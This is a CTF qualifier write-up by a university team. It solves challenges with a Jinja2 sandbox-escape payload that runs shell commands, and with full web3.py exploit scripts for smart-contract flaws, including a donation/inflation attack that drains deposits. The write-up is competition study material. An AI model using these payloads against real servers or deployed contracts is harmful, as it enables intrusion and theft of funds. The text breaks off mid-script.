# 🚩 C2C 2026 QUALIFIERS: MASTER WRITE-UP

**Team Name:** .schnez  
**University:** Institut Teknologi Kalimantan  
**Major:** Informatics  
**Total Challenges Solved:** 12 Challenges  
**Submission Date:** February 16, 2026  
**Author:** Ibnu Dwiki Hermawan

---

## 📋 Table of Contents

1. [General AI Usage Policy](#general-ai-usage-policy)
2. **Misc**
   - [Welcome](#misc-welcome-100-pts)
   - [JinJail](#misc-jinjail-100-pts)
3. **BlockChain**
   - [tge](#blockchain-tge-100-pts)
   - [Convergence](#blockchain-convergence-100-pts)
   - [nexus](#blockchain-nexus-100-pts)
4. **Forensic**
   - [Log](#forensic-log-100-pts)
   - [Tattletale](#forensic-tattletale-100-pts)
5. **Pwn**
   - [ns3](#pwn-ns3-100-pts)
6. **Reverse Engineering**
   - [bunaken](#reverse-engineering-bunaken-100-pts)
7. **Web**
   - [corp-mail](#web-corp-mail-100-pts)
   - [clicker](#web-clicker-100-pts)
   - [The Soldier of God, Rick](#web-the-soldier-of-god-rick-100-pts)
8. [Final Summary of Flags](#final-summary-of-flags)

---

## 🤖 General AI Usage Policy

*This section summarizes the AI tools used across all challenges as per competition requirements.*

- **Overall AI Use:** Yes
- **Primary Models:** Gemini 3 Pro
- **Subscription Tier:** Google AI Pro Free Student
- **Methodology:** 
  > I used AI primarily to [e.g., generate boilerplate scripts, explain specific library errors, or optimize regex]. Every output was manually verified and debugged locally before final execution.

---

## Misc: Welcome (100 pts)

**AI Usage:** No

> Author: SKSD
>
> Welcome to Country-to-Country CTF (C2C) 2026!!
>
> Challenges was created by SKSD

The flag was posted in the home web page at the top-right

**Flag: `C2C{welcome_to_c2c}`**

## Misc: JinJail (100 pts)

**AI Usage:** No

> Author: daffainfo
>
> Pyjail? No, this is JinJail!

### 1. Description & Analysis

- **Environment:** Python/Jinja2 sandbox with a strict WAF.
- **Blocked:** `import`, `os`, `system`, `dict`, quotes (`'`, `"`), and complex string generation.
- **Available:** `numpy` module was exposed in the global scope.

### 2. Analysis & Vulnerability

While direct `os` access was blocked, the `numpy` package contained an exposed reference to the `os` module within `numpy.f2py`.

### 3. Solution (Reproducible)

**Step 1: Accessing `os`**

Standard imports failed. I enumerated `numpy` submodules and found `f2py` retained a reference to the `os` module, bypassing the sandbox import restrictions.

```jinja2
{{ numpy.f2py.os }}
# Output: <module 'os' (frozen)>
```

**Step 2: Bypassing String Restrictions (Stdin Smuggling)**

The WAF prevented constructing strings (e.g., `'ls'`, `dict(ls=1)`). To bypass this, I used Stdin Smuggling.

Instead of writing the shell command inside the Python payload (which requires strings), I instructed Python to read the next line of raw input using `sys.stdin.readline()` and pass it directly to `os.popen`.

**Step 3: The Exploit**

Send the Python payload on the first line, followed immediately by the shell command on the second line.

Payload:

```jinja2
{{numpy.f2py.os.popen(numpy.f2py.os.sys.stdin.readline()).read()}}
```

Execution via Netcat:

```bash
# Paste the following into the nc connection:
{{numpy.f2py.os.popen(numpy.f2py.os.sys.stdin.readline()).read()}}
/fix help 2>&1
```

### Proof of Concept

The payload reads `cat /root/flag.txt` from stdin, bypassing the WAF's string filter, and executes it as a shell command.

**Command:**

```bash
/fix help 2>&1
```

**Flag:** `C2C{damnnn_i_love_numpy_078c3e1922c0}`

---

## BlockChain: tge (100 pts)

**AI Usage:** Yes

> Author: hygge
>
> i dont understand what tge is so all this is very scuffed, but this all hopefully for you to warmup, pls dont be mad
>
> Start challenge from: http://challenges.1pc.tf:50000/c2c2026-quals-blockchain-tge

The challenge provides a set of Solidity contracts (Token.sol, TGE.sol, Setup.sol) representing a "Token Generation Event" system. The goal is to reach Tier 3 status (userTiers(player) == 3), as defined in the isSolved() function of Setup.sol.

### 1. Code Analysis

Upon reviewing TGE.sol, I identified a critical logic flaw in how user eligibility for tier upgrades is calculated versus how the "Pre-TGE Supply" is recorded.

**Upgrade Logic:**

The upgrade(uint256 tier) function allows users to move to a higher tier. It contains a strict requirement:

```solidity
require(preTGEBalance[msg.sender][tier] > preTGESupply[tier], "not eligible");
```

This implies a user's balance during the TGE must exceed the total supply recorded before the TGE ended.

**Snapshot Mechanism:**

The preTGESupply is only updated inside _snapshotPreTGESupply(), which is called exclusively within setTgePeriod:

```solidity
function setTgePeriod(bool _isTge) external onlyOwner {
    if (!_isTge && isTgePeriod && !tgeActivated) {
        tgeActivated = true;
        _snapshotPreTGESupply(); // Snapshot happens here
    }
    isTgePeriod = _isTge;
}
```

Crucially, the snapshot only occurs once, the first time the TGE period is disabled (_isTge is false).

**The Vulnerability:**

If we disable the TGE period before anyone has minted Tier 2 or Tier 3 tokens, the preTGESupply for those tiers will be recorded as 0. If we then re-enable the TGE period, we can call upgrade. The upgrade function calls _mint (increasing our preTGEBalance to 1) before checking the eligibility requirement. Since 1 > 0, the check passes.

### 2. Solution (Reproducible)

The exploitation strategy involves manipulating the isTgePeriod state via the Setup contract to force a favorable snapshot.

**Exploit Steps:**

1. **Buy Tier 1:** Acquire initial tokens to register in the system.
2. **Trigger Snapshot:** Call enableTge(false) via the Setup contract. This freezes preTGESupply for Tier 2 and Tier 3 at 0.
3. **Re-enable TGE:** Call enableTge(true). This is required because upgrade checks require(tgeActivated && isTgePeriod). The supply snapshot is not updated again because tgeActivated is already true.
4. **Upgrade:** Call upgrade(2) and then upgrade(3). The eligibility check (balance > supply) becomes 1 > 0, which evaluates to true.

**Exploit Script (solve.py):**

```python
from web3 import Web3
import sys
import time

# --- CONFIGURATION (Replace with active instance credentials) ---
RPC_URL = "http://challenges.1pc.tf:56806/2c8b392f-3939-48cf-a24b-4f4509ce68e9"
PRIVATE_KEY = "711b1533d6c569e3510080d401855092b7657d1f2b6f05c9cc01fe6a40722a57"
SETUP_ADDRESS = "0x17cd29E9392d46bA89BF0fB300DfE0487d6ed942"

# Connect to RPC
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print("Failed to connect to RPC!")
    sys.exit()

account = w3.eth.account.from_key(PRIVATE_KEY)
player_address = account.address
print(f"Target Setup: {SETUP_ADDRESS}")
print(f"Player: {player_address}")

# ABIs
setup_abi = [
    {"inputs":[],"name":"token","outputs":[{"internalType":"contract Token","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"tge","outputs":[{"internalType":"contract TGE","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"bool","name":"_tge","type":"bool"}],"name":"enableTge","outputs":[],"stateMutability":"public","type":"function"},
    {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
]

tge_abi = [
    {"inputs":[],"name":"buy","outputs":[],"stateMutability":"external","type":"function"},
    {"inputs":[{"internalType":"uint256","name":"tier","type":"uint256"}],"name":"upgrade","outputs":[],"stateMutability":"external","type":"function"}
]

token_abi = [
    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"public","type":"function"}
]

def send_tx(func_call, desc):
    print(f"\nProcessing: {desc}...")
    try:
        tx = func_call.build_transaction({
            'from': player_address,
            'nonce': w3.eth.get_transaction_count(player_address),
            'gas': 2000000,
            'gasPrice': w3.eth.gas_price
        })
        signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        
        # Handle Web3.py v5 vs v6 compatibility
        try:
            raw_tx = signed_tx.raw_transaction
        except AttributeError:
            raw_tx = signed_tx.rawTransaction
            
        tx_hash = w3.eth.send_raw_transaction(raw_tx)
        print(f"  > Tx Hash: {tx_hash.hex()}")
        
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        if receipt.status == 1:
            print("  > Success!")
        else:
            print("  > Failed (Reverted)!")
            sys.exit()
    except Exception as e:
        print(f"  > Error: {e}")
        sys.exit()

def main():
    # 1. Initialize Contracts
    setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
    token_addr = setup.functions.token().call()
    tge_addr = setup.functions.tge().call()
    
    token = w3.eth.contract(address=token_addr, abi=token_abi)
    tge = w3.eth.contract(address=tge_addr, abi=tge_abi)

    # 2. Approve TGE to spend tokens
    send_tx(token.functions.approve(tge_addr, 1000 * 10**18), "Approve Token")

    # 3. Buy Tier 1 (Entry)
    send_tx(tge.functions.buy(), "Buy Tier 1")

    # 4. Disable TGE (Trigger Snapshot: Supply Tier 2 & 3 = 0)
    send_tx(setup.functions.enableTge(False), "Disable TGE (Snapshot Trigger)")

    # 5. Re-enable TGE (Required for upgrade, snapshot remains 0)
    send_tx(setup.functions.enableTge(True), "Enable TGE")

    # 6. Upgrade Tier 2 (Balance 1 > Supply 0)
    send_tx(tge.functions.upgrade(2), "Upgrade to Tier 2")

    # 7. Upgrade Tier 3 (Balance 1 > Supply 0)
    send_tx(tge.functions.upgrade(3), "Upgrade to Tier 3")

    # 8. Check Win Condition
    if setup.functions.isSolved().call():
        print("\n[+] Challenge Solved! Retrieve flag from dashboard.")
    else:
        print("\n[-] Something went wrong.")

if __name__ == "__main__":
    main()
```

### Proof of Concept

After running the script, the isSolved() function returned True. I navigated back to the challenge dashboard, refreshed the instance status, and the flag was available.

**Flag:** `C2C{just_a_warmup_from_someone_who_barely_warms_up}`

---

## BlockChain: Convergence (100 pts)

**AI Usage:** Yes

> Author: chovid99
>
> Convergence....
>
> Start challenge from: http://challenges.1pc.tf:50000/c2c2026-quals-blockchain-convergence

The challenge provides two Solidity contracts: Challenge.sol and Setup.sol. The objective is to invoke the transcend() function in Challenge.sol to become the ascended user.

### 1. Vulnerability Analysis

Upon reviewing the source code, a logic inconsistency was found between the data validation in Setup.sol and the execution requirements in Challenge.sol:

**The Goal:** Challenge.transcend(bytes calldata truth) requires the totalEssence of the provided SoulFragment array to be $\ge$ 1000 ether.

**The Constraint:** Before calling transcend, the data must be registered via Setup.bindPact. This function iterates through the fragments and enforces that each individual fragment has an essence $\le$ 100 ether.

**The Exploit:** The Setup contract fails to check the sum of the essence. We can bypass the restriction by creating an array of 10 fragments, each containing 100 ether.
- Setup Check: $100 \le 100$ (Passes)
- Challenge Check: $\sum(10 \times 100) = 1000$ (Passes)

### 2. Solution (Reproducible)

To solve this, I used a Python script with web3.py. The script registers a seeker, constructs the malicious payload (10 fragments of 100 ether), registers it via Setup, and finally executes transcend.

**Prerequisites:**

```bash
pip install web3
```

**Exploit Script (solve.py):**

```python
import time
from web3 import Web3
from eth_abi import encode

# --- CONFIGURATION ---
RPC_URL = "http://challenges.1pc.tf:39248/08b80b40-a74e-4fca-8656-44b9f53ac8d8"
PRIVKEY = "bec49f187aa74f6994caf07005ee072694dab741c96b5df70d14737c149014da"
SETUP_ADDR = "0x0D0906f1D2cB1d5E196ac6e86F58681cb1b1414C"
WALLET_ADDR = "0x11448d76a8Dee1387cA2AB11A6B2CB22624AE4d8"

# Connect to RPC
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    raise Exception("Failed to connect to RPC")

account = w3.eth.account.from_key(PRIVKEY)
print(f"Solver Address: {account.address}")

# --- ABI ---
SETUP_ABI = [
    {
        "inputs": [],
        "name": "challenge",
        "outputs": [{"internalType": "contract Challenge", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "bytes", "name": "agreement", "type": "bytes"}],
        "name": "bindPact",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

CHALLENGE_ABI = [
    {
        "inputs": [],
        "name": "registerSeeker",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "bytes", "name": "truth", "type": "bytes"}],
        "name": "transcend",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "ascended",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    }
]

# --- TRANSACTION HELPER ---
def send_tx(func_call, tx_desc):
    print(f"Sending tx: {tx_desc}...")
    tx = func_call.build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 2000000,
        'gasPrice': w3.eth.gas_price
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Tx Hash: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    if receipt.status != 1:
        raise Exception(f"{tx_desc} failed!")
    print(f"✅ {tx_desc} Success!")

# --- EXPLOIT LOGIC ---

# 1. Get Challenge Address
setup_contract = w3.eth.contract(address=SETUP_ADDR, abi=SETUP_ABI)
challenge_addr = setup_contract.functions.challenge().call()
challenge_contract = w3.eth.contract(address=challenge_addr, abi=CHALLENGE_ABI)

# 2. Register Seeker
try:
    send_tx(challenge_contract.functions.registerSeeker(), "Register Seeker")
except Exception:
    print("Already registered, continuing...")

# 3. Craft Payload
# We need 1000 ether total. Limit is 100 ether per fragment.
# We create 10 fragments of 100 ether each.
fragment_struct = (
    WALLET_ADDR,        # vessel
    100 * 10**18,       # essence (100 ether)
    b''                 # resonance
)
fragments = [fragment_struct for _ in range(10)]

# Encode: (SoulFragment[], bytes32, uint32, address, address)
# address #1: binder/invoker (must be msg.sender)
# address #2: witness (must be msg.sender)
encoded_data = encode(
    ['(address,uint256,bytes)[]', 'bytes32', 'uint32', 'address', 'address'],
    [fragments, b'\x00'*32, 0, WALLET_ADDR, WALLET_ADDR]
)

# 4. Bind Pact (Bypass validation in Setup)
send_tx(setup_contract.functions.bindPact(encoded_data), "Bind Pact (Setup)")

# 5. Transcend (Win in Challenge)
send_tx(challenge_contract.functions.transcend(encoded_data), "Transcend (Challenge)")

# 6. Verify
ascended = challenge_contract.functions.ascended().call()
if ascended == WALLET_ADDR:
    print(f"🎉 SOLVED! Ascended: {ascended}")
else:
    print(f"Failed. Current Ascended: {ascended}")
```

### Proof of Concept

After running the script above, the transaction was confirmed on the blockchain, and the ascended variable in the contract was updated to my wallet address.

**Flag:** `C2C{the_convergence_chall_is_basically_bibibibi}`

---

## BlockChain: nexus (100 pts)

**AI Usage:** Yes

> Author: chovid99
>
> The essence of nexus.
>
> Start challenge from: http://challenges.1pc.tf:50000/c2c2026-quals-blockchain-nexus

The challenge provides three contracts: Setup.sol, Essence.sol (ERC20 token), and CrystalNexus.sol (a Vault-like contract).

### 1. Key Findings

**The Target:** The Setup contract holds 15,000 Essence and will deposit it into CrystalNexus via the conductRituals() function in two batches (6,000 and 9,000).

**The Mechanism:** The CrystalNexus issues "Crystals" (shares) based on deposited Essence. The calculation in attune() is:

```solidity
crystals = (essenceAmount * totalCrystals) / amplitude();
```

Where `amplitude()` is `essence.balanceOf(address(this)) - catalystReserve`.

**The Vulnerability:** This is a classic Inflation (or Donation) Attack, common in older ERC4626 implementations.

If totalCrystals is very low (e.g., 1 wei) and amplitude() is manipulated to be very high (by directly transferring/donating Essence to the contract), the division result for subsequent depositors will round down to 0.

### 2. Solution (Reproducible)

The strategy relies on front-running the conductRituals transaction.

**Step 1: Initial Deposit**
We attune(1 wei) to mint 1 unit of Crystal. We now own 100% of the pool supply.

**Step 2: Donation**
We transfer a large amount of Essence (e.g., 6,100 ether) directly to the Nexus contract without calling attune. This artificially inflates the amplitude().

**Step 3: Trigger Victim**
We call setup.conductRituals().
- Setup tries to deposit 6,000 ether.
- Calculation: (6000 * 1) / (1 + 6100) = 6000 / 6101 = 0
- Setup transfers 6,000 Essence but receives 0 Crystals.
- Setup tries to deposit 9,000 ether.
- Calculation: (9000 * 1) / (1 + 6100 + 6000) = 9000 / 12101 = 0
- Setup transfers 9,000 Essence but receives 0 Crystals.

**Step 4: Withdraw**
We invoke dissolve(). Since we still own 100% of the crystals (1 wei), we are entitled to 100% of the pool's assets (our deposit + our donation + Setup's 15,000 Essence).

**Exploit Script (solve.py)**

Save the following code and run it using `python3 solve.py`.

```python
from web3 import Web3

# --- CONFIGURATION ---
RPC_URL = "http://challenges.1pc.tf:47617/af34b58f-f42a-403d-aa1f-36f8c4b79700"
PRIVKEY = "afe09f8f1806295a1b358e6fb306f97e1844583473f4ab28fd989cff994a6ece"
SETUP_ADDR = "0x43F8eAc9d9cAeA8A2b6Fe9CFA90cc44C88625bD8"
WALLET_ADDR = "0x688b57f7FF67399E33EaE00039fCD832e76a1415"

# --- WEB3 SETUP ---
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVKEY)

# --- ABIs ---
SETUP_ABI = [
    {"inputs": [], "name": "conductRituals", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "nexus", "outputs": [{"internalType": "address", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "essence", "outputs": [{"internalType": "address", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"}
]

NEXUS_ABI = [
    {"inputs": [{"internalType": "uint256", "name": "essenceAmount", "type": "uint256"}], "name": "attune", "outputs": [{"internalType": "uint256", "name": "crystals", "type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "uint256", "name": "crystalAmount", "type": "uint256"}, {"internalType": "address", "name": "recipient", "type": "address"}], "name": "dissolve", "outputs": [{"internalType": "uint256", "name": "essenceOut", "type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "", "type": "address"}], "name": "crystalBalance", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
]

ESSENCE_ABI = [
    {"inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
]

# --- INIT CONTRACTS ---
setup_contract = w3.eth.contract(address=SETUP_ADDR, abi=SETUP_ABI)
nexus_addr = setup_contract.functions.nexus().call()
essence_addr = setup_contract.functions.essence().call()

nexus_contract = w3.eth.contract(address=nexus_addr, abi=NEXUS_ABI)
essence_contract = w3.eth.contract(address=essence_addr, abi=ESSENCE_ABI)

def send_tx(func):
    tx = func.build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 500000,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(WALLET_ADDR),
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Executing {func.fn_name}... Hash: {tx_hash.hex()}")
    w3.eth.wait_for_transaction_receipt(tx_hash)

# --- ATTACK EXECUTION ---

# 1. Approve Nexus to spend our Essence
print("[*] Approving Nexus...")
send_tx(essence_contract.functions.approve(nexus_addr, 2**256 - 1))

# 2. Attune 1 wei (Initial Deposit to get 100% share of 1 wei crystal)
print("[*] Attuning 1 wei...")
send_tx(nexus_contract.functions.attune(1))

# 3. Donation Attack (Send 6100 ether directly to Nexus)
# This makes the share price extremely expensive.
donation_amount = w3.to_wei(6100, 'ether')
print(f"[*] Donating {w3.from_wei(donation_amount, 'ether')} ESS...")
send_tx(essence_contract.functions.transfer(nexus_addr, donation_amount))

# 4. Trigger Setup (Victim)
# Setup deposits 6000, then 9000.
# Math: (6000 * 1) / 6101 = 0 shares.
print("[*] Triggering Setup Rituals...")
send_tx(setup_contract.functions.conductRituals())

# 5. Withdraw Profit
# We own 1 wei crystal (100% supply). We withdraw everything.
my_crystals = nexus_contract.functions.crystalBalance(WALLET_ADDR).call()
print(f"[*] Dissolving {my_crystals} crystals...")
send_tx(nexus_contract.functions.dissolve(my_crystals, WALLET_ADDR))

# Check final status
final_bal = essence_contract.functions.balanceOf(WALLET_ADDR).call()
print(f"Final Balance: {w3.from_wei(final_bal, 'ether')} ESS")
print(f"Solved: {setup_contract.functions.isSolved().call()}")
```

### Proof of Concept

The script successfully drained the essence from the Setup contract by causing integer underflow in the share calculation. The final balance exceeded 20,250 ESS.

**Flag:** `C2C{the_essence_of_nexus_is_donation_hahahaha}`

---

## Forensic: Log (100 pts)

**AI Usage:** Yes

> Author: daffainfo
>
> My website has been hacked. Please help me answer the provided questions using the available logs!

### 1. Description

**Challenge:** Log  
**Category:** Forensic  
**Points:** 100

The challenge involves analyzing web server logs to extract sensitive information (WordPress email and password hash) that was encrypted via SQL injection payloads embedded in the access log. The task requires parsing the logs to reconstruct the stolen data.

### 2. Solution (Reproducible)

I manually searched through the logs for answers and used AI to help with scripting. Here's the script to extract the email:

```python
import re
import os

# Konfigurasi nama file log
log_file = 'access.log'

def extract_wp_email(file_path):
    # Dictionary untuk menyimpan karakter {posisi: karakter}
    email_chars = {}
    
    pattern = re.compile(r'user_email.*?%2C(\d+)%2C1%29%29%21%3D(\d+)')

    if not os.path.exists(file_path):
        print(f"[!] Error: File '{file_path}' tidak ditemukan.")
        return None

    print(f"[*] Membaca file {file_path}...")
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            # Cari pola di setiap baris
            match = pattern.search(line)
            if match:
                posisi = int(match.group(1)) # Group 1: Posisi karakter
                ascii_val = int(match.group(2)) # Group 2: Nilai ASCII
                
                # Simpan ke dictionary, otomatis update jika ada request ulang
                email_chars[posisi] = chr(ascii_val)

    # Mengurutkan karakter berdasarkan posisi (1, 2, 3, dst) dan menggabungkannya
    sorted_email = "".join([email_chars[i] for i in sorted(email_chars.keys())])
    
    return sorted_email

if __name__ == "__main__":
    result = extract_wp_email(log_file)
    
    if result:
        print(f"[+] Email Ditemukan: {result}")
        
        # Validasi sederhana
        if "daffainfo" in result:
            print("Validasi: Pattern 'daffainfo' ditemukan dalam hasil.")
        else:
            print("Warning: Hasil mungkin belum lengkap atau log terpotong.")
```

Script to extract the hash:

```python
import re

log_file = 'access.log'

def extract_wp_hash(file_path):
    # Dictionary to store characters at specific positions
    hash_chars = {}
    
    # Regex to find the final confirmation payload from sqlmap (!=)
    # Target column: user_pass
    # Pattern looks for: user_pass... LIMIT 0,1),Position,1))!=ASCII_Value
    pattern = re.compile(r'user_pass.*?%2C(\d+)%2C1%29%29%21%3D(\d+)')

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                match = pattern.search(line)
                if match:
                    position = int(match.group(1)) # The character index
                    ascii_val = int(match.group(2)) # The confirmed ASCII value
                    hash_chars[position] = chr(ascii_val) # Convert to char
    except FileNotFoundError:
        return "Log file not found."

    # Join characters by sorted position to reconstruct the string
    sorted_hash = "".join([hash_chars[i] for i in sorted(hash_chars.keys())])
    return sorted_hash

if __name__ == "__main__":
    print("[*] Parsing log file for hash...")
    result = extract_wp_hash(log_file)
    print(f"[+] Extracted Hash: {result}")
```

### 3. Proof of Concept

Successfully extracted both the WordPress email and password hash from the SQL injection payloads. The logs revealed the attacker used sqlmap to enumerate the WordPress database through blind SQL injection.

**Flag:** `C2C{7H15_15_V3rY_345Y_68249ea0153b}`

---


## Forensic: Tattletale (100 pts)

**AI Usage:** Yes

> Author: aseng
>
> Apparently I have just suspected that this serizawa binary is a malware .. I was just so convinced that a friend of mine who was super inactive suddenly goes online today and tell me that this binary will help me to boost my Linux performance.
>
> Now that I realized something's wrong.
>
> Note: This is a reverse engineering and forensic combined theme challenge. Don't worry, the malware is not destructive, not like the other challenge. Once you realized what does the malware do, you'll know how the other 2 files are correlated. Enjoy warming up with this easy one!

### 1. Description & Reconnaissance

**Challenge:** Tattletale  
**Category:** Forensic / Reverse Engineering  
**Points:** 100

Initial analysis of serizawa using pyinstxtractor and pycdc revealed it was a Python script compiled with PyInstaller. The decompiled code showed it was a simple Linux Keylogger that read from `/dev/input/event0` and saved the input_event structs directly to `/opt/cron.aseng`.

This meant `cron.aseng` contained the keystrokes used to encrypt `whatisthis.enc`.

### 2. Solution (Reproducible)

**Step 1: Recover the Password**

The `cron.aseng` file contains binary Linux input events. I wrote a script to parse these events. A critical part of the solution was handling `[BACKSPACE]` and `[CAPSLOCK]` correctly, as the user made typos and used Capslock during the session.

**Manual Analysis Findings:**

The raw logs showed the user typed `4_g00d_fr1en`, backspaced `en`, typed `3n`, toggled Capslock for `D`, typed `_in_n33`, and toggled Capslock again for `D`.

**Recovered Password:** `4_g00d_fr13nD_in_n33D`

**Step 2: Decrypt and Restore**

The logs also revealed the commands used by the attacker:

- `env > whatisthis` (Dumped environment variables)
- `od whatisthis > whatisthis.baboi` (Converted to Octal Dump)
- `openssl enc ... -in whatisthis.baboi -out whatisthis.enc` (Encrypted the dump)

To solve this, I created an all-in-one solver script that:
1. Uses the recovered password to decrypt the file (handling legacy md5 hashing used by the challenge author).
2. Parses the resulting Octal Dump (od) text back into the original binary/text format.

Keylogger reverse script (`keylog.py`):

```python
import struct

# Mapping Kode Tombol Linux (Input Event Codes)
# Sumber: https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h
KEY_NAMES = {
    1: '[ESC]', 2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
    12: '-', 13: '=', 14: '[BACKSPACE]', 15: '[TAB]',
    16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p', 26: '[', 27: ']',
    28: '[ENTER]', 29: '[L_CTRL]',
    30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k', 38: 'l', 39: ';', 40: "'", 41: '`',
    42: '[L_SHIFT]', 43: '\\',
    44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm', 51: ',', 52: '.', 53: '/',
    54: '[R_SHIFT]', 56: '[L_ALT]', 57: '[SPACE]', 58: '[CAPSLOCK]',
    100: '[R_ALT]', 103: '[UP]', 105: '[LEFT]', 106: '[RIGHT]', 108: '[DOWN]',
    111: '[DELETE]', 102: '[HOME]', 107: '[END]', 104: '[PGUP]', 109: '[PGDN]'
}

SHIFT_SYMBOLS = {
    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
    '-': '_', '=': '+', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?', '\\': '|',
    '[': '{', ']': '}', '`': '~'
}

def analyze_cron_raw():
    print("--- MULAI ANALISIS RAW KEYSTROKE ---")
    data_struct = 'QQHHi' # 24 bytes
    chunk_size = struct.calcsize(data_struct)
    
    events = []
    try:
        with open('dist/cron.aseng', 'rb') as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk or len(chunk) != chunk_size: break
                
                _, _, type_, code, value = struct.unpack(data_struct, chunk)
                
                # Kita hanya peduli Type 1 (EV_KEY)
                if type_ == 1:
                    key_name = KEY_NAMES.get(code, f'[UNK_{code}]')
                    
                    # Value 1 = Tekan, 0 = Lepas, 2 = Tahan (Repeat)
                    if value == 1:
                        events.append(f"PRESS {key_name}")
                    elif value == 0:
                        events.append(f"RELEASE {key_name}")
                    # Repeat (value 2) kita abaikan agar tidak spamming
                        
    except FileNotFoundError:
        print("File tidak ditemukan.")
        return

    # --- SIMULASI ---
    print("[*] Merekonstruksi teks dengan indikator kursor...")
    
    output_line = []
    shift_held = False
    
    # Fokus pada bagian perintah openssl
    # Kita akan print semua karakter, tapi tandai tombol spesial
    
    buffer_str = ""
    
    for evt in events:
        action, key = evt.split(' ', 1)
        
        if key in ['[L_SHIFT]', '[R_SHIFT]']:
            shift_held = (action == 'PRESS')
            continue
            
        if action == 'RELEASE': continue # Kita hanya proses saat ditekan
        
        # Proses Karakter
        char_to_add = ""
        
        if key == '[SPACE]':
            char_to_add = " "
        elif key == '[ENTER]':
            char_to_add = "\n"
        elif key == '[BACKSPACE]':
            char_to_add = "<BS>" # Penanda Backspace
        elif key.startswith('['):
            char_to_add = key # Tampilkan tombol spesial apa adanya (misal [LEFT])
        else:
            # Huruf/Angka biasa
            if shift_held:
                if key.isalpha():
                    char_to_add = key.upper()
                elif key in SHIFT_SYMBOLS:
                    char_to_add = SHIFT_SYMBOLS[key]
                else:
                    char_to_add = key
            else:
                char_to_add = key
        
        buffer_str += char_to_add

    # Tampilkan 500 karakter terakhir (biasanya password ada di akhir sesi)
    print("\n--- 500 KARAKTER TERAKHIR ---")
    print(buffer_str[-500:])
    print("\n-----------------------------")
    print("Cari bagian: 'openssl ... -pass pass:...'")
    print("Perhatikan jika ada [LEFT], [RIGHT], [DELETE], atau <BS> di tengah password.")
```

if __name__ == "__main__":
    analyze_cron_raw()
```

Solver Script (solve.py):

```python
import subprocess
import os
import sys

# Configuration
PASSWORD = "4_g00d_fr13nD_in_n33D"
ENC_FILE = "dist/whatisthis.enc"
DUMP_FILE = "whatisthis.baboi_recovered"

def reverse_od_to_text(filepath):
    """Reverses 'od' (Octal Dump) format back to original bytes."""
    try:
        with open(filepath, 'rb') as f:
            content = f.read().decode('utf-8', errors='ignore')
            
        output = bytearray()
        for line in content.split('\n'):
            parts = line.split()
            # Validation: 'od' lines start with an octal offset
            if len(parts) < 2: continue
            try:
                int(parts[0], 8) 
            except ValueError: continue

